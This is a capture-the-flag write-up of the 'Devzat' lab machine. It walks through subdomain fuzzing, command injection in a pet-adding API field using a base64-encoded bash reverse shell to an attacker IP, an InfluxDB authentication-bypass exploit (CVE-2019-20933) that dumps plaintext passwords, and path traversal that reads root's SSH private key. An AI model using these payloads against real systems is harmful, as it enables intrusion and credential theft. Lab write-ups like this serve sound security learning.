@@ -1,0 +1,324 @@
+<h1 id="devzat-machine-writeup">Devzat machine Writeup</h1>
+<h2 id="devzat-writeup">DEVZAT WRITEUP</h2>
+<ul>
+<li>I am trustie_rity and in this writeup ,i will show a detailed walkthrough in solving Devzat machine .</li>
+</ul>
+<p><img src="../images/articles/devzat/devzat.png" /></p>
+<h4 id="enumeration">Enumeration</h4>
+<p>nmap returns the following information about our target.</p>
+<pre><code>Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2022-03-26 09:18 EAT</span>
+Nmap scan report <span class="hljs-keyword">for</span> devzat.htb (<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.118</span>)
+Host is up (<span class="hljs-number">0.40</span>s latency).
+Not <span class="hljs-string">shown:</span> <span class="hljs-number">997</span> closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-string">hostkey:</span> 
+|   <span class="hljs-number">3072</span> <span class="hljs-string">c2:</span><span class="hljs-number">5</span><span class="hljs-string">f:</span><span class="hljs-string">fb:</span><span class="hljs-string">de:</span><span class="hljs-number">32</span>:<span class="hljs-string">ff:</span><span class="hljs-number">44</span>:<span class="hljs-string">bf:</span><span class="hljs-number">08</span>:<span class="hljs-string">f5:</span><span class="hljs-string">ca:</span><span class="hljs-number">49</span>:<span class="hljs-string">d4:</span><span class="hljs-number">42</span>:<span class="hljs-number">1</span><span class="hljs-string">a:</span><span class="hljs-number">06</span> (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-string">bc:</span><span class="hljs-string">cd:</span><span class="hljs-string">e8:</span><span class="hljs-string">ee:</span><span class="hljs-number">0</span><span class="hljs-string">a:</span><span class="hljs-string">a9:</span><span class="hljs-number">15</span>:<span class="hljs-number">76</span>:<span class="hljs-number">52</span>:<span class="hljs-string">bc:</span><span class="hljs-number">19</span>:<span class="hljs-string">a4:</span><span class="hljs-string">a3:</span><span class="hljs-string">b2:</span><span class="hljs-string">ba:</span>ff (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">62</span>:<span class="hljs-string">ef:</span><span class="hljs-number">72</span>:<span class="hljs-number">52</span>:<span class="hljs-number">4</span><span class="hljs-string">f:</span><span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">8</span><span class="hljs-string">b:</span><span class="hljs-string">f2:</span><span class="hljs-number">9</span><span class="hljs-string">b:</span><span class="hljs-string">be:</span><span class="hljs-number">46</span>:<span class="hljs-number">88</span>:<span class="hljs-number">4</span><span class="hljs-string">b:</span><span class="hljs-string">c3:</span>d0 (ED25519)
+<span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span>
+|_http-<span class="hljs-string">title:</span> devzat - where the devs at
+|_http-server-<span class="hljs-string">header:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)
+<span class="hljs-number">8000</span>/tcp open  ssh     (protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-string">hostkey:</span> 
+|_  <span class="hljs-number">3072</span> <span class="hljs-number">6</span><span class="hljs-string">a:</span><span class="hljs-string">ee:</span><span class="hljs-string">db:</span><span class="hljs-number">90</span>:<span class="hljs-string">a6:</span><span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">9</span><span class="hljs-string">f:</span><span class="hljs-number">94</span>:<span class="hljs-string">ff:</span><span class="hljs-string">bf:</span><span class="hljs-number">61</span>:<span class="hljs-number">95</span>:<span class="hljs-number">2</span><span class="hljs-string">a:</span><span class="hljs-number">20</span>:<span class="hljs-number">63</span> (RSA)
+| fingerprint-<span class="hljs-string">strings:</span> 
+|   <span class="hljs-string">NULL:</span> 
+|_    SSH<span class="hljs-number">-2.0</span>-Go
+<span class="hljs-number">1</span> service unrecognized despite returning data. If you know the service<span class="hljs-regexp">/version, please submit the following fingerprint at https:/</span><span class="hljs-regexp">/nmap.org/</span>cgi-bin/submit.cgi?new-service :
+SF-Port8000-<span class="hljs-string">TCP:</span>V=<span class="hljs-number">7.92</span>%I=<span class="hljs-number">7</span>%D=<span class="hljs-number">3</span>/<span class="hljs-number">26</span>%Time=<span class="hljs-number">623</span>EB0A4%P=x86_64-pc-linux-gnu%r(NU
+<span class="hljs-string">SF:</span>LL,C,<span class="hljs-string">"SSH-2\.0-Go\r\n"</span>);
+Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Linux; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">linux:</span>linux_kernel
+
+Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
+Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">162.05</span> seconds
+</code></pre><p>From the scan we get the name of the domain so we quickly add that to /etc/hosts</p>
+<ul>
+<li>Checking port 80 we get a chatting tool .At this point it is not so helpful.
+<img src="../images/articles/devzat/web.png" /></li>
+<li>I did bruteforce the directories and  didn&#39;t find anything juicy.</li>
+<li>I did an nmap scan for the UDP ports and got nothing useful.</li>
+<li>Going ahead i did subdomain enumeration<h4 id="subdomain-enumeration">Subdomain enumeration</h4>
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u
+<a href="http://devzat.htb/">http://devzat.htb/</a> -H &quot;Host:  FUZZ.devzat.htb&quot; --hw 26</li>
+</ul>
+<pre><code>- Perfect i found this  <span class="hljs-keyword">subdomain </span>. <span class="hljs-keyword">Add </span><span class="hljs-keyword">it </span>to /etc/hosts
+</code></pre><hr>
+<ul>
+<li>Wfuzz 3.1.0 - The Web Fuzzer                         *</li>
+</ul>
+<hr>
+<p>Target: <a href="http://devzat.htb/">http://devzat.htb/</a>
+Total requests: 4989</p>
+<p>=====================================================================</p>
+<h1 id="id-response-lines-word-chars-payload-">ID           Response   Lines    Word       Chars       Payload                                                                             </h1>
+<p>000003745:   200        20 L     35 W       510 Ch      &quot;pets&quot;                                                                              </p>
+<p>Total time: 345.5406
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 14.43824</p>
+<pre><code>- We <span class="hljs-keyword">get</span> this website
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/pet.png"</span> /&gt;
+This subdomain has a functionality <span class="hljs-keyword">to</span> add a pet. Capturing <span class="hljs-keyword">the</span> request <span class="hljs-keyword">with</span> burpsuite i was able <span class="hljs-keyword">to</span> do <span class="hljs-keyword">some</span> remote code execution (RCE)
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/burp.png"</span> /&gt;
+
+<span class="hljs-comment">#### Getting reverse shell</span>
+Lets modify <span class="hljs-keyword">the</span> species parameter, we have <span class="hljs-keyword">to</span> use <span class="hljs-keyword">some</span> command <span class="hljs-keyword">to</span> establish a <span class="hljs-built_in">reverse</span> shell <span class="hljs-keyword">in</span> base64 <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> we will decode <span class="hljs-keyword">it</span> <span class="hljs-keyword">and</span> execute <span class="hljs-keyword">it</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> victim machine.
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/term.png"</span> /&gt;
+</code></pre><p>{
+&quot;name&quot;:&quot;cat&quot;,
+&quot;species&quot;:&quot;<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzQ0NDQgMD4mMQo=|base64 -d|bash</code>&quot;
+}</p>
+<pre><code>Before sending <span class="hljs-keyword">the</span> request we <span class="hljs-built_in">open</span> <span class="hljs-keyword">a</span> netcat listener <span class="hljs-built_in">to</span> establish <span class="hljs-keyword">a</span> connection <span class="hljs-keyword">with</span> our reversshell.
+</code></pre><p>rlwrap nc -nlvp 4444</p>
+<pre><code><span class="hljs-comment">#### In reverseshell</span>
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/term1.png"</span> /&gt;
+Now we are <span class="hljs-keyword">the</span> user Patrick, <span class="hljs-keyword">after</span> looking <span class="hljs-keyword">for</span> a <span class="hljs-keyword">while</span> I realized <span class="hljs-keyword">that</span> we have <span class="hljs-keyword">to</span> become <span class="hljs-keyword">the</span> user Catherine, <span class="hljs-keyword">since</span> <span class="hljs-keyword">as</span> Patrick we cannot do much.
+- To establish a more nicer connection ,i <span class="hljs-keyword">get</span> <span class="hljs-keyword">my</span> public ssh keys <span class="hljs-keyword">to</span> patrick's authorized keys so i can connect using ssh.
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/term2.png"</span> /&gt;
+Now we can test <span class="hljs-keyword">the</span> chatting tool we saw <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span> <span class="hljs-keyword">with</span> user Catherine <span class="hljs-keyword">and</span> patrick.
+</code></pre><p> ssh -l [username] devzat.htb -p 8000 </p>
+<pre><code>With <span class="hljs-keyword">user</span> <span class="hljs-title">Catherine</span>.
+</code></pre><p> ssh -l catherine localhost -p 8000 </p>
+<pre><code><span class="hljs-function"><span class="hljs-title">We</span></span> get the following messages ..
+</code></pre><p>patrick: Hey Catherine, glad you came.
+catherine: Hey bud, what are you up to?
+patrick: Remember the cool new feature we talked about the other day?
+catherine: Sure
+patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
+catherine: Kinda busy right now 👔
+patrick: That&#39;s perfectly fine 👍  You&#39;ll need a password I gave you last time.
+catherine: k
+patrick: I left the source for your review in backups.
+catherine: Fine. As soon as the boss let me off the leash I will check it out.
+patrick: Cool. I am very curious what you think of it. See ya!
+devbot: patrick has left the chat</p>
+<pre><code>We noticed that we have <span class="hljs-keyword">a</span> development program <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> port <span class="hljs-number">8443</span>, we keep this information <span class="hljs-keyword">for</span> later, <span class="hljs-keyword">and</span> that we have <span class="hljs-keyword">a</span> password <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> backup <span class="hljs-built_in">directory</span>.
+
+Now trying <span class="hljs-keyword">the</span> same <span class="hljs-keyword">with</span> user patrick .
+I <span class="hljs-built_in">get</span> <span class="hljs-keyword">the</span> following messages.
+</code></pre><p>admin: Hey patrick, you there?
+patrick: Sure, shoot boss!
+admin: So I setup the influxdb for you as we discussed earlier in business meeting.
+patrick: Cool 👍
+admin: Be sure to check it out and see if it works for you, will ya?
+patrick: Yes, sure. Am on it!
+devbot: admin has left the chat</p>
+<pre><code>Once we <span class="hljs-keyword">read</span> this chat we find <span class="hljs-keyword">out</span> that there <span class="hljs-keyword">is</span> an influxdb configured. Investigating about it <span class="hljs-keyword">and</span> carrying <span class="hljs-keyword">out</span> several tests we <span class="hljs-keyword">finally</span> concluded that it <span class="hljs-keyword">is</span> vulnerable. We get the following github exploit.
+[Github Exploit](https:<span class="hljs-comment">//github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git)</span>
+We download it <span class="hljs-keyword">and</span> install the requirements. Before executing it, we must perform a port redirection <span class="hljs-keyword">to</span> our attacking machine, specifically port <span class="hljs-number">8086</span>, since it <span class="hljs-keyword">is</span> the one used <span class="hljs-keyword">by</span> the database.
+</code></pre><p>ssh -i id_rsa_patrick -L 8086:localhost:8086 patrick@devzat.htb</p>
+<pre><code>Once we run <span class="hljs-keyword">the</span> exploit, <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> username wordlist we view <span class="hljs-number">2</span> databases, i tried I have tried <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">with</span> several tables <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-function"><span class="hljs-keyword">end</span> <span class="hljs-title">I</span> <span class="hljs-title">have</span> <span class="hljs-title">come</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">conclusion</span> <span class="hljs-title">that</span> <span class="hljs-title">the</span> <span class="hljs-title">correct</span> <span class="hljs-title">ones</span> <span class="hljs-title">are</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span>. <span class="hljs-title">We</span> <span class="hljs-title">select</span> <span class="hljs-title">the</span> <span class="hljs-title">database</span> <span class="hljs-title">devzat</span></span>
+</code></pre><ul>
+<li>using CVE-2019-20933</li>
+</ul>
+<p>Host (default: localhost): 
+Port (default: 8086): 
+Username <OR> path to username file (default: users.txt): </p>
+<p>Bruteforcing usernames ...
+[v] admin</p>
+<p>Host vulnerable !!!</p>
+<p>Databases:</p>
+<p>1) devzat
+2) _internal</p>
+<pre><code><span class="hljs-keyword">Then</span> we can dump <span class="hljs-keyword">all</span> infomation from user <span class="hljs-keyword">table</span>.
+</code></pre><p>[admin@127.0.0.1/devzat] $ select <em> from &quot;USER&quot;;
+{
+    &quot;results&quot;: [
+        {
+            &quot;statement_id&quot;: 0
+        }
+    ]
+}
+[admin@127.0.0.1/devzat] $ select </em> from &quot;user&quot;;
+{
+    &quot;results&quot;: [
+        {
+            &quot;series&quot;: [
+                {
+                    &quot;columns&quot;: [
+                        &quot;time&quot;,
+                        &quot;enabled&quot;,
+                        &quot;password&quot;,
+                        &quot;username&quot;
+                    ],
+                    &quot;name&quot;: &quot;user&quot;,
+                    &quot;values&quot;: [
+                        [
+                            &quot;2021-06-22T20:04:16.313965493Z&quot;,
+                            false,
+                            &quot;WillyWonka2021&quot;,
+                            &quot;wilhelm&quot;
+                        ],
+                        [
+                            &quot;2021-06-22T20:04:16.320782034Z&quot;,
+                            true,
+                            &quot;woBeeYareedahc7Oog<strong><strong><strong>*</strong></strong></strong>&quot;,
+                            &quot;catherine&quot;
+                        ],
+                        [
+                            &quot;2021-06-22T20:04:16.996682002Z&quot;,
+                            true,
+                            &quot;RoyalQueenBee$&quot;,
+                            &quot;charles&quot;
+                        ]
+                    ]
+                }
+            ],
+            &quot;statement_id&quot;: 0
+        }
+    ]
+}</p>
+<pre><code>Now lets login <span class="hljs-keyword">as</span> user catherine <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> password obtained .
+&lt;img src=<span class="hljs-string">"../images/articles/devzat/patt.png"</span> /&gt;
+<span class="hljs-comment">#### Privelege Escalation :accept: </span>
+After conducting several investigations, I have realized that we can indeed see port <span class="hljs-number">8443</span> <span class="hljs-built_in">open</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">as</span> we had seen <span class="hljs-keyword">before</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> chats that we had <span class="hljs-keyword">a</span> program <span class="hljs-keyword">in</span> development
+</code></pre><p>catherine@devzat:/home$ netstat -punta | grep LISTEN
+(No info could be read for &quot;-p&quot;: geteuid()=1001 but you should be root.)
+tcp        0      0 127.0.0.53:53           0.0.0.0:<em>               LISTEN      -<br>tcp        0      0 127.0.0.1:8086          0.0.0.0:</em>               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:<em>               LISTEN      -<br>tcp        0      0 127.0.0.1:8443          0.0.0.0:</em>               LISTEN      -<br>tcp        0      0 127.0.0.1:5000          0.0.0.0:<em>               LISTEN      -<br>tcp6       0      0 :::80                   :::</em>                    LISTEN      -<br>tcp6       0      0 :::22                   :::<em>                    LISTEN      -<br>tcp6       0      0 :::8000                 :::</em>                    LISTEN      -       </p>
+<pre><code>We had been told that <span class="hljs-keyword">the</span> project was <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> backup <span class="hljs-built_in">directory</span>, now we will proceed <span class="hljs-built_in">to</span> see which project <span class="hljs-keyword">it</span> is, we saw <span class="hljs-keyword">the</span> following <span class="hljs-built_in">files</span> <span class="hljs-keyword">in</span> /var/backups.
+</code></pre><p>catherine@devzat:/var/backups$ ls -al
+total 1356
+drwxr-xr-x  2 root      root        4096 Mar 26 06:25 .
+drwxr-xr-x 14 root      root        4096 Jun 22  2021 ..
+-rw-r--r--  1 root      root       51200 Mar 25 06:25 alternatives.tar.0
+-rw-r--r--  1 root      root       59142 Sep 28 18:45 apt.extended_states.0
+-rw-r--r--  1 root      root        6588 Sep 21  2021 apt.extended_states.1.gz
+-rw-r--r--  1 root      root        6602 Jul 16  2021 apt.extended_states.2.gz
+-rw-------  1 catherine catherine  28297 Jul 16  2021 devzat-dev.zip
+-rw-------  1 catherine catherine  27567 Jul 16  2021 devzat-main.zip
+-rw-r--r--  1 root      root         268 Sep 29 11:46 dpkg.diversions.0
+-rw-r--r--  1 root      root         139 Sep 29 11:46 dpkg.diversions.1.gz
+-rw-r--r--  1 root      root         170 Jul 16  2021 dpkg.statoverride.0
+-rw-r--r--  1 root      root         152 Jul 16  2021 dpkg.statoverride.1.gz
+-rw-r--r--  1 root      root      949034 Jan 26 14:52 dpkg.status.0
+-rw-r--r--  1 root      root      224734 Jan 26 14:52 dpkg.status.1.gz</p>
+<pre><code>The <span class="hljs-built_in">file</span> devzat-dev.zip catches <span class="hljs-keyword">my</span> attention, <span class="hljs-keyword">since</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> tag <span class="hljs-keyword">of</span> “dev” I can guess <span class="hljs-keyword">that</span> <span class="hljs-keyword">it</span> was this <span class="hljs-built_in">file</span> they were talking <span class="hljs-keyword">about</span>. We are going <span class="hljs-keyword">to</span> <span class="hljs-keyword">copy</span> this <span class="hljs-built_in">file</span> <span class="hljs-keyword">to</span> our home directory <span class="hljs-keyword">and</span> we are going <span class="hljs-keyword">to</span> see what <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">about</span>.
+
+After reading all <span class="hljs-keyword">the</span> files I come <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> conclusion <span class="hljs-keyword">that</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> same program <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">in</span> production, <span class="hljs-keyword">but</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> commands.go <span class="hljs-built_in">file</span>, we see <span class="hljs-keyword">that</span> there <span class="hljs-keyword">is</span> a function <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> project <span class="hljs-keyword">in</span> production. We see <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> function <span class="hljs-keyword">is</span> called fileCommand, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> command <span class="hljs-keyword">is</span> called <span class="hljs-built_in">file</span>, this allows us <span class="hljs-keyword">to</span> <span class="hljs-built_in">read</span> files <span class="hljs-keyword">and</span> display them <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> screen, <span class="hljs-keyword">but</span> a password <span class="hljs-keyword">is</span> necessary, <span class="hljs-keyword">but</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> same code we can see <span class="hljs-keyword">that</span> password.
+</code></pre><p>func fileCommand(u *user, args []string) {<br>        if len(args) &lt; 1 {<br>                u.system(&quot;Please provide file to print and the password&quot;)<br>                return<br>        }                                                                                                                                                                                                                                    </p>
+<pre><code>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">args</span>) &lt; <span class="hljs-number">2</span> {                                                                                                                                                                                                                   
+            <span class="hljs-keyword">u</span>.<span class="hljs-built_in">system</span>(<span class="hljs-string">"You need to provide the correct password to use this function"</span>)
+            <span class="hljs-keyword">return</span>
+    }
+
+    path := <span class="hljs-keyword">args</span>[<span class="hljs-number">0</span>]
+    pass := <span class="hljs-keyword">args</span>[<span class="hljs-number">1</span>]
+
+    // Check my secure password
+    <span class="hljs-keyword">if</span> pass != <span class="hljs-string">"Ce********************"</span> {
+            <span class="hljs-keyword">u</span>.<span class="hljs-built_in">system</span>(<span class="hljs-string">"You did provide the wrong password"</span>)
+            <span class="hljs-keyword">return</span>
+    }
+</code></pre><pre><code>Therefore, <span class="hljs-keyword">if</span> we enter <span class="hljs-keyword">the</span> program <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">8443</span>, we can <span class="hljs-built_in">read</span> privileged files <span class="hljs-keyword">with</span> a password. Let’s <span class="hljs-keyword">try</span>.
+</code></pre><p>ssh -l  catherine localhost -p 8443</p>
+<pre><code>We see <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> command <span class="hljs-keyword">is</span> indeed there, so we are going <span class="hljs-keyword">to</span> take advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">it</span>.
+</code></pre><p>[SYSTEM] file - Paste a files content directly to chat [alpha]</p>
+<pre><code>Now we can be able <span class="hljs-keyword">to</span> see id_rsa <span class="hljs-keyword">of</span> root <span class="hljs-keyword">and</span> connect via ssh <span class="hljs-keyword">to</span> <span class="hljs-keyword">it</span>.
+</code></pre><p>catherine: /file ../../root/.ssh/id_rsa PASSWORD
+[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
+[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+[SYSTEM] QyNTUxO<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
+[SYSTEM] HAAAAAt<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
+[SYSTEM] AAAECtF<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
+[SYSTEM] Q0ekw7Z<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>**</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
+[SYSTEM] -----END OPENSSH PRIVATE KEY-----</p>
+<pre><code>Now lets connect <span class="hljs-keyword">as</span> <span class="hljs-string">root :</span>+<span class="hljs-number">1</span>:
+</code></pre><p>ssh -i id_root root@devzat.htb 
+```
+Grab the root flag :)</p>
+<p>Connect with me :)</p>
+<ul>
+<li><a href="https://twitter.com/trustie_rity">twitter</a></li>
+<li><a href="https://github.com/jkiguru">github</a></li>
+<li><a href="https://www.linkedin.com/in/john-kiguru-2960831b8/">linkedin</a></li>
+<li><a href="https://medium.com/@trustie">medium stories</a></li>
+</ul>
+<style>
+
+html, body, .ui-content {
+    background-color: #333;
+    color: #ddd;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+    color: #ddd;
+}
+
+.markdown-body h1,
+.markdown-body h2 {
+    border-bottom-color: #ffffff69;
+}
+
+.markdown-body h1 .octicon-link,
+.markdown-body h2 .octicon-link,
+.markdown-body h3 .octicon-link,
+.markdown-body h4 .octicon-link,
+.markdown-body h5 .octicon-link,
+.markdown-body h6 .octicon-link {
+    color: #fff;
+}
+
+.markdown-body img {
+    background-color: transparent;
+}
+
+.ui-toc-dropdown .nav>.active:focus>a, .ui-toc-dropdown .nav>.active:hover>a, .ui-toc-dropdown .nav>.active>a {
+    color: white;
+    border-left: 2px solid white;
+}
+
+.expand-toggle:hover, 
+.expand-toggle:focus, 
+.back-to-top:hover, 
+.back-to-top:focus, 
+.go-to-bottom:hover, 
+.go-to-bottom:focus {
+    color: white;
+}
+
+
+.ui-toc-dropdown {
+    background-color: #333;
+}
+
+.ui-toc-label.btn {
+    background-color: #191919;
+    color: white;
+}
+
+.ui-toc-dropdown .nav>li>a:focus, 
+.ui-toc-dropdown .nav>li>a:hover {
+    color: white;
+    border-left: 1px solid white;
+}
+
+.markdown-body blockquote {
+    color: #bcbcbc;
+}
+
+.markdown-body table tr {
+    background-color: #5f5f5f;
+}
+
+.markdown-body table tr:nth-child(2n) {
+    background-color: #4f4f4f;
+}
+
+.markdown-body code,
+.markdown-body tt {
+    color: #eee;
+    background-color: rgba(230, 230, 230, 0.36);
+}
+
+a,
+.open-files-container li.selected a {
+    color: #5EB7E0;
+}
+
+</style>
